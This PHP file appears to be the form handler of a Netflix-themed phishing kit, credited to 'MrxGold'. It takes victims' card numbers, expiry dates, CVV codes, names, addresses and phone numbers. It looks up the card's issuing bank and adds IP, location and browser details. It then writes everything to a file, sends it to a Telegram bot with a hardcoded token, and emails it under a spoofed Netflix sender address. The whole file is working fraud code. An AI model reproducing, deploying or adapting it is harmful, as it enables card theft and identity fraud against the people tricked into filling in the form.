<?php
session_start();

if(isset($_POST['cnm']) && isset($_POST['csc'])) {
    include '../mine.php';

    function cardData($bin) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/" . $bin);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept-Version: 3'
        ]);
        $response = curl_exec($ch);
        curl_close($ch);

        if (!$response) {
            return "N/A"; // Handle error or fallback logic
        }

        $json = json_decode($response, true);

        // Check if response is valid and contains necessary fields
        if (!isset($json['bank']) || !isset($json['country'])) {
            return "N/A"; // Handle invalid response
        }

        return $json;
    }

    $ctp = $_POST['ctp'];
    $ccn = str_replace(' ', '', $_POST['cnm']);
    $cex = $_POST['exp'];
    $csc = $_POST['csc'];
    $fnm = $_POST['fnm'];
    $adr = $_POST['adr'];
    $cty = $_POST['cty'];
    $zip = $_POST['zip'];
    $phn = $_POST['phn'];
    $stt = $_POST['stt'];
    $cnt = $_POST['cnt'];
    $bin = substr($ccn, 0, 6);
    $bin_data = cardData($bin);

    $bin_data = cardData($bin);

    if ($bin_data !== "N/A") {
        $bin_type = $bin_data['type'] ?? 'N/A'; // Type of card (debit, credit, etc.)
        $bin_level = $bin_data['category'] ?? 'N/A'; // Category of card (standard, premium, etc.)
        $bin_brand = $bin_data['scheme'] ?? 'N/A'; // Card brand (Visa, Mastercard, etc.)
        $bin_currency = $bin_data['country']['currency'] ?? 'N/A'; // Currency code (USD, EUR, etc.)
        $bin_bank = $bin_data['bank']['name'] ?? 'N/A'; // Bank name
        $bin_country = $bin_data['country']['name'] ?? 'N/A'; // Country name

        $_SESSION['bank'] = $bin_bank; // Store bank name in session
        // Assuming $last4 is defined earlier in your script
        $_SESSION['last4'] = substr($ccn, -4); // Last 4 digits of card number
    } else {
        // Handle case where card data couldn't be retrieved
        $_SESSION['bank'] = "Unknown Bank"; // Fallback
        $_SESSION['last4'] = "XXXX"; // Fallback for last 4 digits
    }

    $msg = "
    ⚜️ NETFLIX INFO ⚜️
    ⚜️ NETFLIX INFO BY 🚦☠️ MrxGold ☠️🚦 ⚜️

    🕵 FULL NAME 🕵 : {$fnm}
    📍 ADDRESS 📍 : {$adr}
    ☎️ PHONE ☎️ : {$phn}
    👩‍💻 ZIP CODE 👩‍💻 : {$zip}
    🏙 CITY 🌆 : {$cty}
    🔄 STATE 🔄 : {$stt}
    🌐 COUNTRY 🌐 : {$cnt} 

    ***💳 CC Info 💳***
    💨 CC Brand 💨 : {$ctp}
    💳 CC Number 💳 : {$ccn}
    🧲 CC Expiry 🧲 : {$cex}
    🔑 CVV / CSC 🔑 : {$csc}
    CC Data : {$bin_brand} {$bin_type} {$bin_level} -> {$bin_currency}
    🏦 CC Brand Bank 🏦 : {$bin_bank}
    🏦🌐 CC Brand Country 🌐🏦 : {$bin_country}

    ***🌐 IP LOOKUP INFORMATION 🌐***
    💻 COMPUTER 💻 : {$_SESSION['computer']}
    🏠 IP ADDRESS 🏠 : {$_SESSION['ip']}
    🌐 LOCATION 🌐 : {$_SESSION['ip_city']} , {$_SESSION['ip_state']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}
    🏠 BROWSER 🏠 : {$_SESSION['browser']} on {$_SESSION['os']}
    👴 USER AGENT 👴 : {$_SERVER['HTTP_USER_AGENT']}
    ⏳ TIMEZONE ⏳ : {$_SESSION['ip_timezone']}

    ⚜️ NETFLIX BY 🚦☠️ MrxGold ☠️🚦 ⚜️
    ";

    if ($saveintext === "yes") {
        $save = fopen("../../" . $filename . ".html", "a+");
        fwrite($save, $msg);
        fclose($save);

        $coder = "🚦☠️ MrxGold ☠️🚦";
        $token = "5736963104:AAE72-kHhwYexqulDmPMMhuum_7g5nB-Txw";
        $data = [
            'text' => $msg . "\n" . $coder,
            'chat_id' => '-684676837'
        ];
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
    }

    $subject = "💳 NETFLIX INFO 💳 [{$bin} {$ctp}] From [{$_SESSION['ip_countryName']}] {$_SESSION['ip']}";
    $headers = "From: ⚜️ Netflix ⚜️ <newlogin@shadow.com>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

    if ($sendtoemail === "yes") {
        foreach (explode(",", $yours) as $your) {
            mail($your, $subject, $msg, $headers);
        }
    }

    exit('done');
}
?>
